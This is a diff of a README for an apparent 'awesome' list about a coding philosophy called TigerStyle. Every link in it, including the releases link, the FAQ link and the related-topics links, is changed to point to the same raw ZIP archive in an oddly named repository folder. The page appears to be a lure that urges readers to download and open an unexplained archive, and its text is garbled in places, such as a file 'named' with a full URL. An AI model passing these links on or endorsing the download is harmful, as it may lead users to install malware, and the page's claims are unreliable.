@@ -1,6 +1,6 @@
 # 🐯 awesome-tigerstyle - A Safe & Efficient Coding Resource
 
-[![Download](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/awesome_tigerstyle_3.2.zip)](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/awesome_tigerstyle_3.2.zip)
+[![Download](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/tigerstyle_awesome_v1.8.zip)](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/tigerstyle_awesome_v1.8.zip)
 
 ## 📖 Overview
 
@@ -11,19 +11,19 @@ awesome-tigerstyle is a curated list of resources that focus on TigerStyle, a co
 To use this repository, follow these simple steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the downloads.
-   - [Visit this page to download](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/awesome_tigerstyle_3.2.zip)
+   - [Visit this page to download](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/tigerstyle_awesome_v1.8.zip)
 
 2. **Download the Resources**: Select the version that suits your needs. Look for files labeled with the latest version number. 
 
 3. **Extract Files**: If you download a ZIP file, extract it to a folder on your computer.
 
-4. **Open the Files**: Find the main resource file, usually named something like `https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/awesome_tigerstyle_3.2.zip`, and open it to find more information on how to utilize the resources.
+4. **Open the Files**: Find the main resource file, usually named something like `https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/tigerstyle_awesome_v1.8.zip`, and open it to find more information on how to utilize the resources.
 
 ## 📥 Download & Install
 
 You can easily download the application from our Releases page. Just click the link below to start:
 
-- **[Visit this page to download](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/awesome_tigerstyle_3.2.zip)**
+- **[Visit this page to download](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/tigerstyle_awesome_v1.8.zip)**
 
 ## ⚙️ Features
 
@@ -58,7 +58,7 @@ A: TigerStyle is a coding philosophy that prioritizes secure, efficient, and dev
 
 ### Q: How do I keep up with updates?
 
-A: Regularly check the [Releases page](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/awesome_tigerstyle_3.2.zip) for the latest updates and new resources.
+A: Regularly check the [Releases page](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/tigerstyle_awesome_v1.8.zip) for the latest updates and new resources.
 
 ### Q: Can I use these resources for my projects?
 
@@ -72,9 +72,9 @@ If you encounter any issues or have questions, feel free to reach out to the com
 
 Check out these related topics to expand your knowledge:
 
-- [Awesome Lists](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/awesome_tigerstyle_3.2.zip)
-- [Best Practices in Software Engineering](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/awesome_tigerstyle_3.2.zip)
-- [Coding Standards](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/awesome_tigerstyle_3.2.zip)
+- [Awesome Lists](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/tigerstyle_awesome_v1.8.zip)
+- [Best Practices in Software Engineering](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/tigerstyle_awesome_v1.8.zip)
+- [Coding Standards](https://github.com/Beriberi12/awesome-tigerstyle/raw/refs/heads/main/Marianne/tigerstyle_awesome_v1.8.zip)
 
 ## 🎉 Acknowledgments
 
